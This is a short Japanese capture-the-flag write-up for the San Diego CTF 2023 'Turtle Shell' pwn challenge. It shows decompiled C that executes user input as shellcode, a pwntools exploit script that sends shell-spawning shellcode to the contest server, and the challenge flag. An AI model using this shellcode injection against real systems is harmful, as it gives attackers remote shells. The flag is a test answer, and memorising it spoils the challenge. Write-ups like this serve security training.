# San Diego CTF CTF 2023 `Turtle Shell [pwn]` writeup

## 問題
A turtle without it's shell is a sad sight to see

Connect via: `nc turtle.sdc.tf 1337`

Dockerfileと実行バイナリが配布される。

## 解法
問題名からしてシェルコードなんだろうなと思いつつもとりあえず雑デバック。

```c

bad = 0x400778

undefined8 main(){
  char *chk;
  undefined buf [56];
  code *shellcode;
  
  setbuf(stdin,(char *)0x0);
  setbuf(stdout,(char *)0x0);
  setbuf(stderr,(char *)0x0);
  puts("Say something to make the turtle come out of its shell");
  fgets(buf,0x32,stdin);
  chk = strstr(buf,bad);
  if (chk == (char *)0x0) {
    shellcode = (code *)buf;
    (*shellcode)();
  }
  return 0;
}
```

`strstr(buf,bad)`でシェルコードをチェックして、0x400778と一致する箇所がなければ実行してくれる。

試しに`shellcraft.sh()`を流し込んでみる。普通にシェル取れた。

？？

`bad`はバイナリ上のアドレスだったのだろうか。
シェルコード中に含ませる意味も薄いのでよくわからない。

## Exploit

```py
from pwn import *
import sys

elf = ELF("turtle-shell")

# io = process(elf.path)
io = remote('turtle.sdc.tf', 1337)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']

# gdb.attach(io)

shellcode = asm(shellcraft.sh())
bad = b'\x78\x07\x40'

print(len(shellcode))


if bad in shellcode:
    print("detected!")
    exit()

io.sendlineafter(b'shell\n', shellcode)

io.interactive()
```

FLAG: `sdctf{w0w_y0u_m4d3_7h3_7urT13_c0m3_0u7_0f_1t5_5h3l1}`